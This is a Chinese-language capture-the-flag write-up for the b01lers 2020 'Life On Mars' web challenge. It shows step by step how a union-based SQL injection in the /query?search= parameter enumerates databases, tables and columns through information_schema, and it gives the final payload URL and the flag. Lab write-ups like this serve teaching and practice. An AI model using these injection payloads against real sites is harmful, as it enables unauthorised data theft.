> Problem: [[b01lers 2020]Life On Mars](https://www.nssctf.cn/problem/2280)

## Web

#SQL注入

### 解题过程

#### 1. 页面分析

打开题目网页，显示火星生命信息网站。查看页面源代码发现：

- 侧边栏有多个火星地名链接
- 每个链接调用JavaScript函数：`get_life('')`
- 点击侧边栏发现页面URL始终不变，内容通过AJAX动态加载

#### 2. 查看JS代码

js代码中life_on_mars显然是自定义文件

访问`/static/js/life_on_mars.js`发现关键函数：

```javascript
function get_life(query) {
  $.ajax({
    type: "GET",
    url: "/query?search=" + query,
    // ...
  });
}
```

**确定API端点**：`/query?search=地名`

#### 3. 测试API端口

直接访问API端点进行测试：

```
http://node4.anna.nssctf.cn:21525/query?search=amazonis_planitia
```

返回该地区的生物数据（JSON格式）

#### 4. SQL注入验证

测试SQL注入：

```
/query?search=amazonis_planitia union select version(),database()
```

返回结果末尾包含数据库信息（版本和名字）：

```json
["5.7.37","alien_code"]
```

存在SQL注入漏洞

1.列数为2 （名字，描述）

2. 查所有数据库

```
union select 1,group_concat(schema_name) from information_schema.schemata
```

结果["1","information_schema,alien_code"]（占位，所有库）

3.查alien_code库的表

```
union select 1,group_concat(table_name) from information_schema.tables where table_schema='alien_code'
```

结果["1","amazonis_planitia,arabia_planitia,chryse_planitia,**code**,hellas_basin,hesperia_planum,noachis_terra,olympus_mons,tharsis_rise,utopia_basin"]

找到code表

4.查code表有哪些列

```
/query?search=amazonis_planitia union select 1,group_concat(column_name) from information_schema.columns where table_schema='alien_code' and table_name='code'
```

结果["1", "id,code"]

#### 5. 获取flag

查询`alien_code`数据库中的`code`表：

```
/query?search=amazonis_planitia union select 1,group_concat(code) from alien_code.code
```

* `amazonis_planitia`：有效参数，保证SQL执行
* `union select`：合并查询
* `1`：占位name
* `group_concat(code)`：第二列code值
* `from alien_code.code`：从alien_code库的code表查询

返回结果末尾包含flag

### 最终Payload

```
http://node4.anna.nssctf.cn:21525/query?search=amazonis_planitia union select 1,group_concat(code) from alien_code.code
```

### Flag

`NSSCTF{5b03eaae-bc9c-43b5-8027-e8bc69a86eb1}`

### 总结

- 注入点：`/query?search=`参数
- 注入类型：Union-based SQL注入
- 构造union查询
- Flag存储在`alien_code`数据库的`code`表第二列`code`值中